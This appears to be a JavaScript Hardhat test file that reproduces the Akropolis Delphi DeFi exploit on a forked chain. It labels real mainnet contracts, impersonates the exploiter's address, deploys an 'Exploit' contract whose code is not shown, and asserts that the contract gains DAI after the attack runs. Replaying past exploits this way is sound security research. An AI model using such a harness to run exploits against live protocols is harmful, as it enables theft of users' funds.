const { assert } = require("chai");
const [addresses, forkFrom, impersonate] = require('../utils/utils.js');

hre.tracer.nameTags["0x7967ada2a32a633d5c055e2e075a83023b632b4e"] = "Curve yPool";
hre.tracer.nameTags["0x73fC3038B4cD8FfD07482b92a52Ea806505e5748"] = "SavingsModule";
hre.tracer.nameTags["0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3"] = "Curve yDeposit";
hre.tracer.nameTags["0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51"] = "Curve ySwap";
hre.tracer.nameTags["0x0000000000000000000000000000000000000000"] = "Zero Address";
hre.tracer.nameTags["0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01"] = "yDai";
hre.tracer.nameTags["0x6b175474e89094c44da98b954eedeac495271d0f"] = "Dai";
hre.tracer.nameTags["0xd6ad7a6750a7593e092a9b218d66c0a814a3436e"] = "yUSDC";
hre.tracer.nameTags["0x83f798e925bcd4017eb265844fddabb448f1707d"] = "yUSDT";
hre.tracer.nameTags["0x73a052500105205d34daf004eab301916da8190f"] = "yTUSD";
hre.tracer.nameTags["0xdf5e0e81dff6faf3a7e52ba697820c5e32d806a8"] = "yCRV";
hre.tracer.nameTags["0x2afa3c8bf33e65d5036cd0f1c3599716894b3077"] = "dyPool";
hre.tracer.nameTags["0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1"] = "yCRVGuage";
hre.tracer.nameTags["0x5FbDB2315678afecb367f032d93F642f64180aa3"] = "ExploitContract";
hre.tracer.nameTags["0xa478c2975ab1ea89e8196811f51a7b7ade33eb11"] = "dai/eth LP";
hre.tracer.nameTags["0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d"] = "aDai (aave)";

describe("Akropolis Delphi exploit", async () => {
    let dai;
    let dyPool;
    let exploit;
    let attacker;
    let tx;

    before(async () => {
        impersonate(addresses.exploiter);
        attacker = ethers.provider.getSigner(addresses.exploiter);
        dai = await ethers.getContractAt("IUniswapV2ERC20", addresses.dai);
        dyPool = await ethers.getContractAt("IUniswapV2ERC20", addresses.dyPool);
        const Exploit = await ethers.getContractFactory("Exploit");
        exploit = await Exploit.deploy();
        attacker.sendTransaction({
            to: exploit.address,
            value: 10
        });        
    });        
    

    // const tx = await exploit.run(0, {gasLimit: 82000000, gasPrice: 102});
    describe("Preparation", async () => {



        
        it("contract dai balance is zero", async () => {
            const amountDai = await dai.connect(attacker).callStatic.balanceOf(exploit.address);
            assert.equal(amountDai, 0);

        });   
        it("contract dai balance is greater than $20,000 dai", async () => {
            tx = await exploit.run(0, {gasLimit: 82000000, gasPrice: 102});
            const amountDai = await dai.connect(attacker).callStatic.balanceOf(exploit.address);
            // console.log(ethers.BigNumber.from("0x2a"));
            assert(amountDai.gt(ethers.utils.parseEther("20")));
            // const receipt = await tx.wait();

            // const event = receipt.events.find(x => x.event === "DyPoolBalance");

            // console.log(receipt.events); // 1  

        }); 





    });










  });  
  
    // console.log(tx.hash);
    // const receipt = await ethers.provider.getTransactionReceipt(tx.hash);
    // for(i = 0; i< receipt.logs.length; i++) {
    //   if(receipt.logs[i].address == '0x73fC3038B4cD8FfD07482b92a52Ea806505e5748') {
    //     console.log("Entry: ", receipt.logs[i].topics);
    //     console.log("Data: ", parseInt(receipt.logs[i].data));
    //   }
    // }
   // console.log( await ethers.provider.getTransactionReceipt(tx.hash));
    //await exploit.run({gasLimit: 82000000, gasPrice: 99});
// 5,000,000.000000000000000000
